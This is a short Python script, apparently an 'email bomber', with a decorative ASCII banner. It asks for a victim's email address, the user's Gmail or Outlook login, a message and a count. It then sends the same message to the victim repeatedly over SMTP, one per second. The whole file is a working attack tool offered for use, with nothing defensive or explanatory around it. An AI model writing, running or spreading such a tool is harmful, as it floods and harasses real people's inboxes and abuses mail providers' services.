import smtplib
import time
print ("\033_________    __        __        ____        ________    __                                             \033")
print ("\033|########|  |##\      /##|      /####\      |########|  |##|              By Gloobus                 \033")
print ("\033|##|____    |###\ __ /###|     /##/\##\        |##|     |##|            Made with Love from gloobus           \033")
print ("\033|########|  |##| |##| |##|    /########\       |##|     |##|         ____   __       ____   __  ___     \033")
print ("\033|##|_____   |##|      |##|   /##/    \##\    __|##|__   |##|_______   |__| |  | |\/|  |__| |__  |__|    \033")
print ("\033|########|  |##|      |##|  /##/      \##\  |########|  |##########| _|__| |__| |  | _|__| |__  |  \    \033")

try:
    bomb_email = input("Enter Email address on Whom you want to perfom this attack: ")
    email = input("Enter your gmail_address:")
    password = input("Enter your gmail_password:")
    message = input("Enter Message:")
    counter = int(input("How many message you want to send?:"))

    # gmail of outlook
    s_ = input('Select the service provider (Gmail / Outlook): ').lower()

    if s_ == "gmail":
        mail = smtplib.SMTP('smtp.gmail.com',587)
    elif s_ == "outlook":
        mail = smtplib.SMTP('smtp.office365.com',587)

    for x in range(0,counter):
        print("Number of Message Sent : ", x+1)
        mail.ehlo()
        mail.starttls()
        mail.login(email,password)
        mail.sendmail(email,bomb_email,message)
        time.sleep(1)

    mail.close()
except Exception as e:
    print("Something is wrong, please Re-try Again with Valid input.")